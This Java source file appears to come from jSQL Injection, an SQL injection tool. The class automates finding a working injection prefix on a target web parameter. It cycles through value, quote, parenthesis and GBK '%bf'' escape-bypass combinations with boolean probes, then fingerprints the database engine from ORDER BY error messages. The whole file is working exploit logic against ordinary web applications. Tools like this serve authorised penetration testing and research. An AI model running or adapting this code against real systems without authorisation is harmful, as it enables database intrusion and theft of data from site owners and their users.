package com.jsql.model.suspendable;

import com.jsql.model.InjectionModel;
import com.jsql.util.CookiesUtil;
import com.jsql.util.JsonUtil;
import com.jsql.view.subscriber.Seal;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.InjectionCharInsertion;
import com.jsql.model.injection.engine.MediatorEngine;
import com.jsql.model.injection.engine.model.Engine;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.util.I18nUtil;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.*;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.regex.Pattern;
import java.util.stream.Stream;

/**
 * Runnable class, define insertionCharacter to be used during injection,
 * i.e -1 in "...php?id=-1 union select...", sometimes it's -1, 0', 0, etc.
 * Find working insertion char when error message occurs in source.
 * Force to 1 if no insertion char works and empty value from user,
 * Force to user's value if no insertion char works,
 * Force to insertion char otherwise.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable {

    private static final Logger LOGGER = LogManager.getRootLogger();
    private final String parameterOriginalValue;

    public SuspendableGetCharInsertion(InjectionModel injectionModel, String parameterOriginalValue) {
        super(injectionModel);
        this.parameterOriginalValue = parameterOriginalValue;
    }

    @Override
    public String run(Input input) throws JSqlException {
        String characterInsertionByUser = input.payload();

        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().threadUtil().getExecutor("CallableGetInsertionCharacter");
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        var characterInsertionFoundOrByUser = new String[1];
        characterInsertionFoundOrByUser[0] = characterInsertionByUser;  // either raw char or cookie char, with star
        List<String> charactersInsertionForOrderBy = this.initCallables(taskCompletionService, characterInsertionFoundOrByUser);

        var mediatorEngine = this.injectionModel.getMediatorEngine();
        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "[Step 3] Fingerprinting database and prefix using ORDER BY...");

        String charFromOrderBy = null;

        int total = charactersInsertionForOrderBy.size();
        while (0 < total) {
            if (this.isSuspended()) {
                throw new StoppedByUserSlidingException();
            }
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();

                List<Engine> enginesOrderByMatches = this.getEnginesOrderByMatch(mediatorEngine, pageSource);
                if (!enginesOrderByMatches.isEmpty()) {
                    if (this.injectionModel.getMediatorEngine().getEngineByUser() == this.injectionModel.getMediatorEngine().getAuto()) {
                        this.setEngine(mediatorEngine, enginesOrderByMatches);
                        this.injectionModel.sendToViews(new Seal.ActivateEngine(mediatorEngine.getEngine()));
                    }

                    charFromOrderBy = currentCallable.getCharacterInsertion();
                    String finalCharFromOrderBy = charFromOrderBy;
                    LOGGER.log(
                        LogLevelUtil.CONSOLE_SUCCESS,
                        "Found prefix [{}] using ORDER BY and compatible with Error strategy",
                        () -> SuspendableGetCharInsertion.format(finalCharFromOrderBy)
                    );
                    break;
                }
            } catch (InterruptedException e) {
                LOGGER.log(LogLevelUtil.IGNORE, e, e);
                Thread.currentThread().interrupt();
            } catch (ExecutionException e) {
                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
            }
        }
        this.injectionModel.getMediatorUtils().threadUtil().shutdown(taskExecutor);
        if (charFromOrderBy == null && characterInsertionFoundOrByUser[0] != null) {
            charFromOrderBy = characterInsertionFoundOrByUser[0];
        }
        return this.getCharacterInsertion(characterInsertionByUser, charFromOrderBy);
    }

    private void setEngine(MediatorEngine mediatorEngine, List<Engine> enginesOrderByMatches) {
        if (
            enginesOrderByMatches.size() == 1
            && enginesOrderByMatches.getFirst() != mediatorEngine.getEngine()
        ) {
            mediatorEngine.setEngine(enginesOrderByMatches.getFirst());
        } else if (enginesOrderByMatches.size() > 1) {
            if (enginesOrderByMatches.contains(mediatorEngine.getPostgres())) {
                mediatorEngine.setEngine(mediatorEngine.getPostgres());
            } else if (enginesOrderByMatches.contains(mediatorEngine.getMysql())) {
                mediatorEngine.setEngine(mediatorEngine.getMysql());
            } else {
                mediatorEngine.setEngine(enginesOrderByMatches.getFirst());
            }
        }
    }

    private List<Engine> getEnginesOrderByMatch(MediatorEngine mediatorEngine, String pageSource) {
        return mediatorEngine.getEnginesForFingerprint()
            .stream()
            .filter(engine -> engine != mediatorEngine.getAuto())
            .filter(engine -> StringUtils.isNotEmpty(
                engine.instance().getModelYaml().getStrategy().getConfiguration().getFingerprint().getOrderByErrorMessage()
            ))
            .filter(engine -> {
                Optional<String> optionalOrderByErrorMatch = Stream.of(
                    engine.instance().getModelYaml().getStrategy().getConfiguration().getFingerprint().getOrderByErrorMessage()
                    .split("[\\r\\n]+")
                )
                .filter(errorMessage ->
                    Pattern
                    .compile(".*" + errorMessage + ".*", Pattern.DOTALL)
                    .matcher(pageSource)
                    .matches()
                )
                .findAny();
                if (optionalOrderByErrorMatch.isPresent()) {
                    LOGGER.log(
                        LogLevelUtil.CONSOLE_SUCCESS,
                        "Found [{}] using ORDER BY",
                        engine
                    );
                }
                return optionalOrderByErrorMatch.isPresent();
            })
            .toList();
    }

    private List<String> initCallables(CompletionService<CallablePageSource> completionService, String[] characterInsertionFoundOrByUser) throws JSqlException {
        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "[Step 2] Fingerprinting prefix using boolean match...");

        List<String> prefixValues = List.of(
            RandomStringUtils.secure().next(10, "012"),  // trigger probable failure
            StringUtils.EMPTY,  // trigger matching, compatible with backtick
            "1"  // trigger eventual success
        );
        List<String> prefixQuotes = List.of(
            "'",
            StringUtils.EMPTY,
            "`",
            "\"",
            "%bf'"  // GBK slash encoding use case
        );
        List<String> prefixParentheses = List.of(
            StringUtils.EMPTY,
            ")",
            "))"
        );
        List<String> charactersInsertionForOrderBy = this.findWorkingPrefix(
            prefixValues,
            prefixQuotes,
            prefixParentheses,
            characterInsertionFoundOrByUser
        );
        this.submitCallables(completionService, charactersInsertionForOrderBy);
        return charactersInsertionForOrderBy;
    }

    private List<String> findWorkingPrefix(
        List<String> prefixValues,
        List<String> prefixQuotes,
        List<String> prefixParentheses,
        String[] characterInsertionFoundOrByUser
    ) throws JSqlException {
        List<String> charactersInsertionForOrderBy = new ArrayList<>();
        for (String value: prefixValues) {
            for (String quote: prefixQuotes) {
                for (String parenthesis: prefixParentheses) {
                    String prefix = this.buildPrefix(value, quote, parenthesis);
                    if (this.checkInsertionChar(
                        characterInsertionFoundOrByUser,
                        charactersInsertionForOrderBy,
                        prefix
                    )) {
                        return charactersInsertionForOrderBy;
                    }
                }
            }
        }
        return charactersInsertionForOrderBy;
    }

    private void submitCallables(CompletionService<CallablePageSource> completionService, List<String> charactersInsertionForOrderBy) {
        for (String characterInsertion: charactersInsertionForOrderBy) {
            completionService.submit(
                new CallablePageSource(
                    characterInsertion.replace(
                        InjectionModel.STAR,
                        StringUtils.SPACE  // covered by cleaning
                        + this.injectionModel.getMediatorEngine().getEngine().instance().sqlOrderBy()
                    ),
                    characterInsertion,
                    this.injectionModel,
                    "prefix#orderby"
                )
            );
        }
    }

    private String buildPrefix(String value, String quote, String parenthesis) {
        var prefixValueAndQuote = value + quote;
        var requiresSpace = prefixValueAndQuote.matches(".*\\w$") && parenthesis.isEmpty();
        return prefixValueAndQuote + parenthesis + (requiresSpace ? "%20" : StringUtils.EMPTY);
    }

    private boolean checkInsertionChar(
        String[] characterInsertionFoundOrByUser,
        List<String> charactersInsertionForOrderBy,
        String prefixParenthesis
    ) throws StoppedByUserSlidingException {  // requires prefix by user for cookie, else empty and failing
        var isCookie = this.injectionModel.getMediatorMethod().getHeader() == this.injectionModel.getMediatorUtils().connectionUtil().getMethodInjection()
            && this.injectionModel.getMediatorUtils().parameterUtil().getListHeader()
            .stream()
            .anyMatch(entry ->
                CookiesUtil.COOKIE.equalsIgnoreCase(entry.getKey())
                && entry.getValue().contains(InjectionModel.STAR)
            );

        var isJson = false;
        if (StringUtils.isNotBlank(this.parameterOriginalValue)) {  // can be null when path param
            Object jsonEntity = JsonUtil.getJson(this.parameterOriginalValue);
            isJson = !JsonUtil.createEntries(jsonEntity, "root", null).isEmpty();
        }

        var isRawParamRequired = isJson || isCookie;

        if (isRawParamRequired) {
            charactersInsertionForOrderBy.add(characterInsertionFoundOrByUser[0].replace(
                InjectionModel.STAR,
                prefixParenthesis
                + InjectionModel.STAR
                + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment()
            ));
        } else {
            charactersInsertionForOrderBy.add(
                prefixParenthesis
                + InjectionModel.STAR
                + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment()
            );
        }

        InjectionCharInsertion injectionCharInsertion;
        if (isRawParamRequired) {
            injectionCharInsertion = new InjectionCharInsertion(
                this.injectionModel,
                characterInsertionFoundOrByUser[0].replace(InjectionModel.STAR, prefixParenthesis),
                characterInsertionFoundOrByUser[0].replace(InjectionModel.STAR, prefixParenthesis + InjectionModel.STAR)
            );
        } else {
            injectionCharInsertion = new InjectionCharInsertion(
                this.injectionModel,
                prefixParenthesis,
                prefixParenthesis + InjectionModel.STAR
                + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment()
            );
        }

        if (this.isSuspended()) {
            throw new StoppedByUserSlidingException();
        }
        if (injectionCharInsertion.isInjectable()) {
            if (isRawParamRequired) {
                characterInsertionFoundOrByUser[0] = characterInsertionFoundOrByUser[0].replace(
                    InjectionModel.STAR,
                    prefixParenthesis + InjectionModel.STAR
                    + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment()
                );
            } else {
                characterInsertionFoundOrByUser[0] = prefixParenthesis
                    + InjectionModel.STAR
                    + this.injectionModel.getMediatorEngine().getEngine().instance().endingComment();
            }

            LOGGER.log(
                LogLevelUtil.CONSOLE_SUCCESS,
                "Found [{}] using boolean match",
                () -> SuspendableGetCharInsertion.format(characterInsertionFoundOrByUser[0])
            );
            return true;
        }
        return false;
    }

    private String getCharacterInsertion(String characterInsertionByUser, String characterInsertionDetected) {
        String characterInsertionDetectedFixed = characterInsertionDetected;
        if (characterInsertionDetectedFixed == null) {
            characterInsertionDetectedFixed = characterInsertionByUser;
            String logCharacterInsertion = characterInsertionDetectedFixed;
            LOGGER.log(
                LogLevelUtil.CONSOLE_ERROR,
                "No prefix found, forcing to [{}]",
                () -> SuspendableGetCharInsertion.format(logCharacterInsertion)
            );
        } else if (
            !SuspendableGetCharInsertion.format(characterInsertionByUser).isBlank()
            && !SuspendableGetCharInsertion.format(characterInsertionByUser).equals(
                SuspendableGetCharInsertion.format(characterInsertionDetectedFixed)
            )
        ) {
            String finalCharacterInsertionDetectedFixed = characterInsertionDetectedFixed;
            LOGGER.log(
                LogLevelUtil.CONSOLE_INFORM,
                "Found prefix [{}], disable auto search in Preferences to force [{}]",
                () -> SuspendableGetCharInsertion.format(finalCharacterInsertionDetectedFixed),
                () -> SuspendableGetCharInsertion.format(characterInsertionByUser)
            );
        } else {
            LOGGER.log(
                LogLevelUtil.CONSOLE_INFORM,
                "{} [{}]",
                () -> I18nUtil.valueByKey("LOG_USING_INSERTION_CHARACTER"),
                () -> SuspendableGetCharInsertion.format(characterInsertionDetected)
            );
        }
        return characterInsertionDetectedFixed;
    }

    public static String format(String prefix) {  // trim space prefix in cookie
        return prefix.trim().replaceAll("(%20)?"+ Pattern.quote(InjectionModel.STAR) +".*", StringUtils.EMPTY);
    }
}
